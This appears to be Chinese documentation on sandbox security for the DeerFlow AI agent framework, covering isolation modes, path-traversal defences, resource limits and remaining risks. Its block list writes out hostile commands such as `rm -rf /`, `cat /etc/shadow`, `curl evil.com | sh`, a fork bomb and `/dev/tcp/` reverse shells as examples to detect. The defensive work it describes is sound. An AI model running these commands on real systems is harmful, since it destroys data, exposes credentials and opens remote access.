# 沙箱治理

Agent 执行 bash 命令、读写文件时，能碰到什么？不能碰到什么？这是 IT 管理者最关心的问题——"一段 prompt 能不能搞出 `rm -rf /`？"

## 三种沙箱模式

| 模式 | `sandbox.use` | 隔离级别 | 适用场景 |
|------|--------------|---------|---------|
| **Local** | `deerflow.sandbox.local:LocalSandboxProvider` | 无进程隔离，共享 host 内核 | 个人开发、信任环境 |
| **Docker (AioSandbox)** | `deerflow.community.aio_sandbox:AioSandboxProvider` | 容器隔离 | 团队部署 |
| **K3s (Provisioner)** | `deerflow.sandbox.provisioner:ProvisionerSandboxProvider` | Pod 隔离 | 多租户、高安全需求 |

**Local 模式的特殊风险：** agent 的 bash 命令直接在 host 上执行。所有隔离依赖虚拟路径翻译——如果路径翻译有 bug，agent 就能碰到系统文件。

## 6 层路径防穿透

DeerFlow 不是靠一层防护来防路径穿越——它是 6 层叠加的纵深防御：

| 层 | 位置 | 机制 |
|----|------|------|
| **1. 虚拟路径体系** | `LocalSandboxProvider` → `PathMapping` | agent 只看到 `/mnt/user-data/{workspace,uploads,outputs}`，物理路径在 `users/{user_id}/threads/{thread_id}/` 下 |
| **2. 工具层路径翻译** | `sandbox/tools.py` → `replace_virtual_path()` | 每个 tool（bash, read_file, write_file, ls, str_replace）都调用路径翻译，把虚拟路径转成 host 路径 |
| **3. `allow_host_bash` 开关** | `sandbox/security.py` → `is_host_bash_allowed()` | Local 模式下默认**禁止**直接 host bash——强制启用时必须显式配置 |
| **4. CWD 注入** | `tools.py` bash handler | 每个 bash 命令前自动注入 `cd /mnt/user-data/workspace &&`，把命令限定在 workspace |
| **5. 路径参数校验** | 各 tool 实现 | 拒绝 `..` 穿越、绝对系统路径（`/etc/passwd`）、符号链接逃逸 |
| **6. 输出路径脱敏** | `tools.py` → `mask_local_paths_in_output()` | 即使 host 路径意外出现在输出中，也会被正则替换回虚拟路径 |

### Bash 子命令审计

SandboxAuditMiddleware 把 bash 命令按 `&&`/`||`/`;` 切分成子命令，逐条正则匹配。防止用 `ls /safe/path && rm -rf /` 这种拼接绕过检测。

### 高危命令示例（会 block）

- `rm -rf /` 及其变体（`rm -rf --no-preserve-root /`）
- `dd if=` 磁盘覆写
- `cat /etc/shadow` 读取密码文件
- 重定向到 `/etc/`（`echo ... > /etc/cron.d/...`）
- pipe 到 `sh`/`bash`（`curl evil.com | sh`）
- `base64 -d |` 管道（解码后执行）
- 覆盖 `/usr/bin/`、`/bin/`、`/sbin/`
- fork bomb（`:(){ :|:& };:`）
- `LD_PRELOAD`/`LD_LIBRARY_PATH` 注入
- `/dev/tcp/` 反向 shell

### 中危命令（会 warn，不拦截）

- `chmod 777`
- `pip install` / `apt-get install`
- `sudo` / `su`
- `PATH=` 环境变量修改

## 资源管控

| 资源 | 限制 | 位置 |
|------|------|------|
| **Sandbox 实例数** | Local: LRU cache 256 个 per-thread sandbox | `sandbox/local/` |
| **bash 输出** | middle truncation 20,000 字符 | `tools.py` |
| **read_file 输出** | head 50,000 字符 | `tools.py` |
| **ls 输出** | head 20,000 字符 | `tools.py` |
| **命令长度** | 拒绝 >10,000 字符的 bash 命令 | `sandbox_audit_middleware.py` |
| **null byte** | 拒绝含 null byte 的命令 | `sandbox_audit_middleware.py` |

## Per-Thread 隔离

每个 thread 有自己的 sandbox 实例。在 Local 模式下：

```
thread_1 → sandbox_id="local:thread_1" → workspace at users/alice/threads/t1/workspace
thread_2 → sandbox_id="local:thread_2" → workspace at users/alice/threads/t2/workspace
```

两个 thread 之间无法通过 sandbox 读写对方的文件。文件操作锁 `(sandbox_id, path)` 粒度确保同一 sandbox 内并发写同一文件时有互斥。

## 还要担心什么

| 风险 | 现状 | 建议 |
|------|------|------|
| **Local 模式 host bash** | `allow_host_bash` 默认关，但可以被配置打开 | 生产环境必须用 Docker 或 K3s |
| **Container escape** | Docker/K3s 依赖 container runtime 安全 | 保持 Docker/K3s 版本更新，关注 CVE |
| **Resource exhaustion** | 无 CPU/内存限制 | 在 Docker/K3s 层配 cgroup limit |
| **网络访问** | Agent 可以通过 curl/wget 访问外网 | 评估是否需要网络隔离（sandbox network policy） |
| **Skills 注入** | 恶意 skill 可被 agent 加载 | Skills security scanner（LLM 扫描 + 人工审核） |
